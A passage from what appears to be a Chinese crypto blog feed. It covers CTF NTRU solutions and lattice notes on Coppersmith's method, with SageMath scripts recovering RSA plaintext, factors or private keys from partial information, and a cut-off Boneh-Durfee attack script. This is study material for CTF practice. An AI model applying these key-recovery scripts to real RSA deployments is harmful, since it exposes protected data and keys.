class="number">0</span>]*x[<span class="number">1</span>],<span class="built_in">zip</span>(c,a)))</span><br></pre></td></tr></table></figure><p>功能就是把 $c$ 和 $a$ 两两相乘再相加</p><p>显然如果有 $key$ ，逆推回去就很容易，那么就想办法找 $key$ 的关系，因为有<br>$$<br>c &#x3D; \sum_{i&#x3D;1}^{lenth}m_i\cdot key_i<br>$$<br>结合数据即<br>$$<br>{\begin{bmatrix}<br>x_1&amp;x_2&amp;x_3&amp;\cdots&amp;x_n \\<br>x_2&amp;x_3&amp;x_4&amp;\cdots&amp;x_{n+1} \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>x_n&amp;x_{n+1}&amp;x_{n+2}&amp;\cdots&amp;x_{2n} \\<br>\end{bmatrix}}<br>\cdot<br>{\begin{bmatrix}<br>key_1 \\<br>key_2 \\<br>\vdots \\<br>key_n \\<br>\end{bmatrix}}<br>&#x3D;<br>{\begin{bmatrix}<br>x_{n+1}&amp;x_{n+2}&amp;x_{n+3}&amp;\cdots&amp;x_{2n}<br>\end{bmatrix}}<br>$$<br>拿到 $key$ 之后，<del>想怎么做怎么做</del></p><h2 id="son-of-NTRU"><a href="#son-of-NTRU" class="headerlink" title="son_of_NTRU"></a>son_of_NTRU</h2><p>数字类的NTRU，甚至是原题，抄起之前的exp直接就秒了（</p><p>NTRU原理不多说了，对矩阵<br>$$<br>M&#x3D;<br>{\begin{bmatrix}<br>h&amp;1\\<br>p&amp;0<br>\end{bmatrix}}<br>$$<br>一定存在一个向量 $\vec{v}&#x3D;(f,-k)$ 满足<br>$$<br>\vec{v}\cdot M&#x3D;\vec{x}&#x3D;(g,f)<br>$$<br>而且是最短的，格基规约后就能拿到 $g$ 和 $f$ 了</p><h2 id="threshold"><a href="#threshold" class="headerlink" title="threshold"></a>threshold</h2><p><del>还nm是个NTRU，出题人是有多喜欢NTRU</del></p><p>多项式下的NTRU，构造矩阵<br>$$<br>B&#x3D;<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{h(x)} \\<br>\pmb{0}&amp;\pmb{q}<br>\end{bmatrix}}<br>$$</p><p>格基规约后拿最短的作为新的 $f(x)$ 和 $g(x)$ 重新实现一下解密就能求得 $m(x)$ </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-MAR-DASCTF’s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-MAR-DASCTF’s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for MAR DASCTF’s crypt</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Lattice learning 2</title>
    <link href="http://example.com/2021/03/18/Lattice_learning2/"/>
    <id>http://example.com/2021/03/18/Lattice_learning2/</id>
    <published>2021-03-18T08:19:25.000Z</published>
    <updated>2021-04-03T08:56:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lattice-learning-2"><a href="#Lattice-learning-2" class="headerlink" title="Lattice learning 2"></a>Lattice learning 2</h1><blockquote><p>这篇博客refer的东西太多了，所以要看别的师傅的版本的话可以转路友链里的密码师傅们</p></blockquote><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>格子真是好玩的东西，但是看得再多的博客也不如自己亲自调几个格子来的清楚，比如各种优化或者约束</p><h2 id="Chapher-5-Encryption-mode-in-Lattice"><a href="#Chapher-5-Encryption-mode-in-Lattice" class="headerlink" title="Chapher 5 Encryption mode in Lattice"></a>Chapher 5 Encryption mode in Lattice</h2><h3 id="Coppersmith"><a href="#Coppersmith" class="headerlink" title="Coppersmith"></a>Coppersmith</h3><p>Coppersmith是啥？</p><p><del>铜匠！炼铜！</del></p><p><img src="/img/Lattice_learning/4.png" alt="Coppersmith"></p><p>在我看来就是一种在有限域内解方程的方法，比方说 $f(x)&#x3D;x^4+114x+514$ 且对于有特殊关系的 $x_0$ 满足关系 $f(x_0)\equiv0\pmod{N}$ ，去求解这样的 $x_0$ 时我们可以使用Coppersmith’s methed。对于度为 $d$ 的多项式 $f(x)$ ，如果这个 $x_0$ 满足 $|x0|&lt; N^{\frac{1}{d}-\varepsilon}$ ，那么就能在多项式的时间内被找出。</p><blockquote><p>假设 $N$ 是一个未知因子组成的数，且存在一个因子 $b\geq N^\beta(0&lt;\beta\leq 1)$ ，$f(x)$ 是一个一元一次 $d$ 阶的多项式，且 $c\geq 1$ ，那么可以在 $O(cd^5log^9(N))$ 的复杂度内求解所有的 $x_0$ 。</p><p>$f(x_0)&#x3D;0\pmod{b},x_0\leq cN^{\frac{\beta^2}{d}}$</p></blockquote><blockquote><p>这里关于证明，等我有时间<del>把高等代数学会了再</del>回来证</p></blockquote><p>线性代数中我们学过：任何的函数都可以被写成一个基函数的样子，当然求导也是一种线性变换，如下图：<br>$$<br>Basis~functions{&#x3D;\begin{bmatrix}<br>1\\x\\x^2\\x^3\\\vdots<br>\end{bmatrix}}<br>~~<br>\frac{d}{dx}&#x3D;<br>{\begin{bmatrix}<br>0&amp;1&amp;0&amp;0&amp;\cdots\\<br>0&amp;0&amp;2&amp;0&amp;\cdots\\<br>0&amp;0&amp;0&amp;3&amp;\cdots\\<br>0&amp;0&amp;0&amp;0&amp;\cdots\\<br>\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots<br>\end{bmatrix}}<br>$$<br>说了这么多，Coppersmith到底是干嘛的？对于一元Coppersmith，它的作用就是找出一个 $F(x)&#x3D;A\cdot f(x)-N\cdot g(x)$ ，这样就能利用牛顿法求出使得 $F(x)&#x3D;0$ 的 $x_0$ ，那么此时 $f(x_0)\equiv0$ 也是显而易见的了。</p><p>我们不妨把函数 $f(x)&#x3D;x^d+a_{d-1}x^{d-1}+\cdots+a_1x+a_0$ 表示成一个类似基函数的向量： $\vec{a}&#x3D;(a_0,xa_1,x^2a_2,\cdots,x^da_d)$ ，那么只要 $||\vec{a}||&lt;\frac{N}{\sqrt{d+1}}$ 且 $F(x_0)\equiv0\pmod{N}$ ，就有 $f(x_0)\equiv0$ ，关于Coppersmith的证明和界的扩大方法这里指路V神的博客。</p><h4 id="已知部分明文攻击"><a href="#已知部分明文攻击" class="headerlink" title="已知部分明文攻击"></a>已知部分明文攻击</h4><p>设 $m&#x3D;m_0+x$ ，我们可以找到 $f(x)&#x3D;(m_0+x)^e-c\pmod{N}$ ，当 $e$ 和 $x$ 较小时，Coppersmith即可计算出 $x$ 的值</p><blockquote><p>$b&#x3D;N,d&#x3D;e,\beta&#x3D;1$ 则 $|x|\leq cN^{\frac{\beta^2}{d}}&#x3D;cN^{\frac{1}{e}}$ ，因此为了求解，我们至少需要知道关于m至少 $(1-\frac{1}{e})\cdot N.bit_length()$ bit的信息</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line">kbits = <span class="comment"># unknow x bit</span></span><br><span class="line">m0 = </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="comment"># f(x)</span></span><br><span class="line">f = f.monic()</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits,beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(x0)</span><br></pre></td></tr></table></figure><h4 id="已知部分因子攻击"><a href="#已知部分因子攻击" class="headerlink" title="已知部分因子攻击"></a>已知部分因子攻击</h4><p>设 $p&#x3D;p_0+x$ ， $f(x)&#x3D;p_0+x$ 此时我们把 $N$ 看做 $k\cdot p$ ，又因为 $-p_0\equiv x\pmod{p}$ ，则可以找到 $K\cdot f(x)-M\cdot p&#x3D;0$</p><blockquote><p>$b&#x3D;p$ ，且RSA中 $p$ 和 $q$ 通常是满足 $p&lt;q&lt;2p$ 所以 $p\approx N^{0.4}$ ，也就是说 $\beta&#x3D;0.4$ 附近较为适合，另外 $|x|&lt;N^{\frac{1}{3}}$ ，我们只要知道 $p$ 一半bit就可以求出这样的 $x$ 。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">p0 = </span><br><span class="line">kbits = </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="comment"># f(x)</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">p = x0 + p0</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure><h4 id="已知部分私钥攻击"><a href="#已知部分私钥攻击" class="headerlink" title="已知部分私钥攻击"></a>已知部分私钥攻击</h4><p>来自论文《An Attack on RSA Given a Small Fraction of the Private Key Bits》</p><p>设 $d&#x3D;d_0+x$ ，且 $d_0$ 是私钥 $d$ 的kbits低位，那么显然 $d_0\equiv d\pmod{2^{kbits}}$ ，那么有 $e\cdot d_0&#x3D;e\cdot d&#x3D;1+k\cdot\varphi(N)&#x3D;1+k(N-(p+q)+1)\pmod{2^{kbits}}$ ，</p><p>则通过解方程 $e\cdot d_0\cdot X-k\cdot X\cdot(N-X+1)&#x3D;X$ 就可以得到所有可能的 $i\cdot p+j\cdot q\pmod{2^{kbits}}$ 的值，接着再求解 $p^2-xp+N&#x3D;0\pmod{2^{kbits}}$ 即可得到 $p$ 的低位值，将上面两个式子联立，即只需要解一个方程 $e\cdot d_0\cdot X - k\cdot X\cdot(n-X+1) + k\cdot n &#x3D;&#x3D; X$ 即可得到低位的 $p$ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">partial_p</span>(<span class="params">p0, kbits, n</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">d = </span><br><span class="line">nbits = n.nbits()</span><br><span class="line">kbits = d.nbits()</span><br><span class="line"></span><br><span class="line">p = find_p(d, kbits, e, n)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = %d&quot;</span> % p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = %d&quot;</span> % q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d0 = %d&quot;</span> % d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d = %d&quot;</span> % inverse_mod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h3 id="多消息攻击"><a href="#多消息攻击" class="headerlink" title="多消息攻击"></a>多消息攻击</h3><h4 id="线性相关消息攻击"><a href="#线性相关消息攻击" class="headerlink" title="线性相关消息攻击"></a>线性相关消息攻击</h4><p>已知 $c1&#x3D;m^e\pmod{N}$ ， $c2&#x3D;(a\cdot m+b)^e\pmod{N}$</p><blockquote><p>首先用 $e&#x3D;3$ 举个栗子，我们可以通过构造 $m&#x3D;\frac{m\cdot f(m)}{f(m)}$ 的格式来求 $m$ ，比方说 $e&#x3D;3$ 时，我们能构造 $m&#x3D;\frac{b}{a}\cdot\frac{c_2+2a^3c_1-b^3}{c_2-a^3c_1+2b^3}$ </p></blockquote><p>关于更高维的，<del>等我学会就来写</del>，这里指路<a href="https://link.springer.com/content/pdf/10.1007%2F3-540-68339-9_1.pdf">《Low-Exponent RSA with Related Messages》</a></p><h4 id="多消息相关攻击"><a href="#多消息相关攻击" class="headerlink" title="多消息相关攻击"></a>多消息相关攻击</h4><p>Waiting for undate……</p><h4 id="Hastad广播攻击"><a href="#Hastad广播攻击" class="headerlink" title="Hastad广播攻击"></a>Hastad广播攻击</h4><p>Waiting for undate……</p><h4 id="SMUPE攻击"><a href="#SMUPE攻击" class="headerlink" title="SMUPE攻击"></a>SMUPE攻击</h4><p>Waiting for undate……</p><h3 id="Boneh-and-Durfee-attack"><a href="#Boneh-and-Durfee-attack" class="headerlink" title="Boneh and Durfee attack"></a>Boneh and Durfee attack</h3><p>Waiting for undate……</p><p>先放一个别人的版本，等后面自己实现完了之后来换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2020/10/31 23:37</span></span><br><span class="line"><span class="comment"># @Author : A.James</span></span><br><span class="line"><span class="comment"># @FileName: tt6.py</span></span><br><span class="line"><span class="comment"># @Email : alexjames@sina.com</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span>  <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii, jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span 